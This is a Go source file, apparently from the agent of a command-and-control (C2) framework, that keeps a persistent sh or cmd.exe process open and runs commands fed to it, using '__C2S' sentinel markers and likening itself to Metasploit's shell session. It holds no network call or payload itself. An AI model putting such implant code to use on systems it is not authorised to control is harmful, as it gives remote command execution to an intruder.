package agent

import (
	"bufio"
	"fmt"
	"io"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// sentinelSeq generates unique per-command markers that terminate output reads.
var sentinelSeq uint64

// shellSession is a persistent shell process (sh or cmd.exe) with piped
// stdin/stdout/stderr. Commands are written to stdin and output is demarcated
// by a unique per-call sentinel echo, giving persistent cwd and environment
// across commands, the same behaviour as Metasploit's shell session.
type shellSession struct {
	cmd       *exec.Cmd
	stdin     io.WriteCloser
	reader    *bufio.Reader
	closeOnce sync.Once
}

func newShellSession() (*shellSession, error) {
	// Merge stdout and stderr through a single io.Pipe so the reader sees
	// interleaved output in the same order as a real terminal would.
	pr, pw := io.Pipe()

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh")
	}
	cmd.Stdout = pw
	cmd.Stderr = pw

	stdin, err := cmd.StdinPipe()
	if err != nil {
		pr.Close()
		pw.Close()
		return nil, fmt.Errorf("stdin pipe: %w", err)
	}

	if err := cmd.Start(); err != nil {
		stdin.Close()
		pr.Close()
		pw.Close()
		return nil, fmt.Errorf("start shell: %w", err)
	}

	sess := &shellSession{
		cmd:    cmd,
		stdin:  stdin,
		reader: bufio.NewReaderSize(pr, 64*1024),
	}

	// Close the pipe writer when the shell exits so blocked reads unblock.
	go func() {
		cmd.Wait() //nolint:errcheck
		pw.Close()
	}()

	// Synchronise on an init sentinel and suppress any startup banners/prompts.
	if err := sess.initShell(); err != nil {
		sess.close()
		return nil, fmt.Errorf("shell handshake: %w", err)
	}

	return sess, nil
}

// initShell sends setup commands appropriate for the OS and waits for the
// shell to confirm it is ready. Discards any banner/prompt output.
func (s *shellSession) initShell() error {
	var setup string
	if runtime.GOOS == "windows" {
		// /Q disables echo; PROMPT= empties the prompt; both suppress all
		// decorations so only raw command output reaches our reader.
		setup = "@echo off\r\nPROMPT=\r\necho __C2INIT__\r\n"
	} else {
		setup = "echo __C2INIT__\n"
	}

	if _, err := io.WriteString(s.stdin, setup); err != nil {
		return err
	}

	type res struct{ err error }
	ch := make(chan res, 1)
	go func() {
		for {
			line, err := s.reader.ReadString('\n')
			if strings.TrimRight(line, "\r\n") == "__C2INIT__" {
				ch <- res{nil}
				return
			}
			if err != nil {
				ch <- res{err}
				return
			}
		}
	}()

	select {
	case r := <-ch:
		return r.err
	case <-time.After(10 * time.Second):
		return fmt.Errorf("timeout waiting for shell ready signal")
	}
}

// run writes command to the shell's stdin and collects output until the
// per-call sentinel appears. Returns (output, false) on shell death or timeout;
// the caller should discard this session and start a new one.
func (s *shellSession) run(command string) (string, bool) {
	seq := atomic.AddUint64(&sentinelSeq, 1)
	marker := fmt.Sprintf("__C2S%d__", seq)

	var payload string
	if runtime.GOOS == "windows" {
		payload = command + "\r\necho " + marker + "\r\n"
	} else {
		payload = command + "\necho " + marker + "\n"
	}

	if _, err := io.WriteString(s.stdin, payload); err != nil {
		return "", false
	}

	type readResult struct {
		output string
		ok     bool
	}
	ch := make(chan readResult, 1)

	go func() {
		var sb strings.Builder
		for {
			line, err := s.reader.ReadString('\n')
			if line != "" {
				trimmed := strings.TrimRight(line, "\r\n")
				if trimmed == marker {
					ch <- readResult{sb.String(), true}
					return
				}
				// Skip stale sentinels left by a previously timed-out run().
				if isC2Sentinel(trimmed) {
					continue
				}
				if sb.Len() < maxShellOutputBytes {
					sb.WriteString(line)
				}
			}
			if err != nil {
				ch <- readResult{sb.String(), false}
				return
			}
		}
	}()

	select {
	case r := <-ch:
		return r.output, r.ok
	case <-time.After(shellTimeout):
		// Kill the shell so the reader goroutine unblocks and sends to ch,
		// then exits cleanly. ch is buffered so the goroutine never leaks.
		s.close()
		return "", false
	}
}

func isC2Sentinel(s string) bool {
	return strings.HasPrefix(s, "__C2S") && strings.HasSuffix(s, "__")
}

// close terminates the shell process exactly once.
func (s *shellSession) close() {
	s.closeOnce.Do(func() {
		s.stdin.Close()
		if s.cmd.Process != nil {
			s.cmd.Process.Kill()
		}
	})
}

// persistentShell manages one shellSession, restarting it transparently when
// the process dies or a command times out.
type persistentShell struct {
	mu   sync.Mutex
	sess *shellSession
}

// exec runs command in the persistent shell, lazily starting it on first use.
func (p *persistentShell) exec(command string) (string, string) {
	p.mu.Lock()
	defer p.mu.Unlock()

	if p.sess == nil {
		sess, err := newShellSession()
		if err != nil {
			return "", fmt.Sprintf("failed to start shell: %v", err)
		}
		p.sess = sess
	}

	output, ok := p.sess.run(command)
	if !ok {
		p.sess.close()
		p.sess = nil
		if output != "" {
			return output, "shell restarted (timed out or terminated)"
		}
		return "", "shell timed out or terminated"
	}
	return output, ""
}

// close shuts down the active shell process.
func (p *persistentShell) close() {
	p.mu.Lock()
	defer p.mu.Unlock()
	if p.sess != nil {
		p.sess.close()
		p.sess = nil
	}
}
